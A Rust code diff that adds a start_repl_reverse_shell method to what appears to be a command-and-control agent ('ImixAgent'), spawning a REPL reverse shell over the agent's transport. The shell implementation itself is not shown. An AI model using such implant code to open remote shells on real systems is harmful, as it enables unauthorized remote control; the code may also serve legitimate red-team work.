@@ -7,7 +7,7 @@ use std::sync::{Arc, Mutex};
 use tokio::sync::RwLock;
 use transport::Transport;
 
-use crate::shell::run_reverse_shell_pty;
+use crate::shell::{run_repl_reverse_shell, run_reverse_shell_pty};
 use crate::task::TaskRegistry;
 
 pub struct ImixAgent<T: Transport> {
@@ -146,6 +146,28 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         });
 
         // Store handle
+        if let Ok(mut map) = subtasks.lock() {
+            map.insert(task_id, handle);
+        }
+
+        Ok(())
+    }
+
+    fn start_repl_reverse_shell(&self, task_id: i64) -> Result<(), String> {
+        let subtasks = self.subtasks.clone();
+
+        let transport_clone = self.block_on(async {
+            let guard = self.transport.read().await;
+            Ok(guard.clone())
+        })?;
+
+        let handle = self.runtime_handle.spawn(async move {
+            if let Err(e) = run_repl_reverse_shell(task_id, transport_clone).await {
+                #[cfg(debug_assertions)]
+                log::error!("repl_reverse_shell error: {}", e);
+            }
+        });
+
         if let Ok(mut map) = subtasks.lock() {
             map.insert(task_id, handle);
         }
